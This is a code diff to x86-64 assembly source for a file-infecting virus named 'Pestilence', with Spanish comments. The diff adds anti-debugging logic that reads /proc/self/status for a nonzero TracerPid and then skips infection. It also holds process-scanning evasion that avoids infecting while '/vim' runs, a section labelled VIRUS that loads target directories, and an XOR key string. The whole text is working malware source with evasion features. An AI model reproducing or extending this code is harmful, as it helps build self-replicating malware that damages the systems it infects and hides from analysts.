@@ -33,6 +33,26 @@ section .text
         ret
         .directory_name_isdigit_end:
 
+    close_proc_dir:
+        push rax
+        push rdi
+        mov rax, SC_CLOSE
+        mov rdi, VAR(Pestilence.fd_proc)
+        syscall ; nos la suda lo que esto retorne la verdad
+        pop rdi
+        pop rax
+        ret
+
+    close_status_file:
+        push rax
+        push rdi
+        mov rax, SC_CLOSE
+        mov rdi, VAR(Pestilence.fd_status)
+        syscall
+        pop rdi
+        pop rax
+        ret
+
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -68,7 +88,7 @@ section .text
         mov rax, SC_GETDENTS64
         syscall
         test rax, rax
-        jle .close_proc_dir
+        jle .check_tracerpid
         xor r12, r12
         mov rbx, rax
 
@@ -159,13 +179,13 @@ section .text
         rep cmpsb
         ; si está el forbidden program corriendo, saltamos al entrypoint
         ; original (no infectamos)
-        je .cleanup_and_jump_to_host
+        je .cleanup_and_jump_to_host_0
 
         ; siguiente directorio.
         jmp .cleanup_and_check_dir_in_proc
 
-    .cleanup_and_jump_to_host:
-        TRACE_TEXT hello, 11
+    .cleanup_and_jump_to_host_0:
+        call close_proc_dir
         add rsp, 256
         jmp .jump_to_host
 
@@ -173,15 +193,76 @@ section .text
         add rsp, 256
         jmp .check_dir_in_proc
 
-    .close_proc_dir:
-        mov rax, SC_CLOSE
-        mov rdi, VAR(Pestilence.fd_proc)
+    .check_tracerpid:
+        ; abrimos /proc/self/status
+        call close_proc_dir
+        lea rdi, [rel status_file]
+        mov rsi, O_RDONLY
+        mov rax, SC_OPEN
         syscall
+        test rax, rax
+        jle .start_infection
+
+        ; guardamos el valor del fd para poder cerrarlo a posteriori
+        mov VAR(Pestilence.fd_status), rax
+
+        ; leemos el ficherín (raro sería que midiese mas de 4KB)
+        mov rdi, rax
+        sub rsp, 0x1000
+        lea rsi, [rsp]
+        mov rdx, 0x1000
+        mov rax, SC_READ
+        syscall
+        test rax, rax
+        jle .close_status_file_and_infect
+
+        ; inicializamos el buffer del fichero para el rep cmpsb
+        xor rbx, rbx
+        lea rdi, [rsi]
+
+    .search_trace:
+        cmp rbx, rax
+        jge .close_status_file_and_infect
+
+        ; Cuando se llama a rep cmpsb, éste shiftea los buffers de rdi y rsi
+        ; tantas veces como la comparación haya sido exitosa, y devuelve en rcx
+        ; el valor inicial - el numero de iteracions.
+        ; Entonces por cada iteracion tenemos que resetear rcx, rsi, pero no hace
+        ; falta rdi porque así se recorre el buffer del fichero a medida que se llama.
+        lea rsi, [rel tracerPid_str]
+        mov rcx, 0xb
+        cld
+        rep cmpsb
+        je .check_tracerPid_value
+
+        ; rcx = 0xb - <número de comparaciones OK>
+        ; rbx += 0xb - rcx
+        mov rdx, 0xb
+        sub rdx, rcx
+        add rbx, rdx
+
+        jmp .search_trace
+
+    .cleanup_and_jump_to_host_1:
+        add rsp, 0x1000
+        call close_status_file
+        TRACE_TEXT hello, 11
+        jmp .jump_to_host
+
+    .check_tracerPid_value:
+        cmp byte [rdi], 0x30 ; == "0"
+        jne .cleanup_and_jump_to_host_1
+
+    .close_status_file_and_infect:
+        add rsp, 0x1000
+        call close_status_file
+
+    .start_infection:
+        ;load dirs
+        call close_proc_dir
+        lea rdi, [dirs]
 
 ; ----------------------------------------- VIRUS -------------------------------------------------------------------
-
-        ;load dirs
-        lea rdi, [dirs]
 
     .open_dir:
         ; save dirname pointer to iterate after
@@ -491,6 +572,9 @@ section .text
         xor rdi, rdi
         syscall
 
+    tracerPid_str   db      "TracerPid:",0x9 ; 11
+    ; tracerPid_str   db      "Name:" ; 5
+    status_file     db      "/proc/self/status",0 ; 18
     xor_pass        db      "p3st1l3!" ; 8
     forbidden_prog  db      "/vim",0 ; 4
     exe_string      db      "/exe",0 ; 5
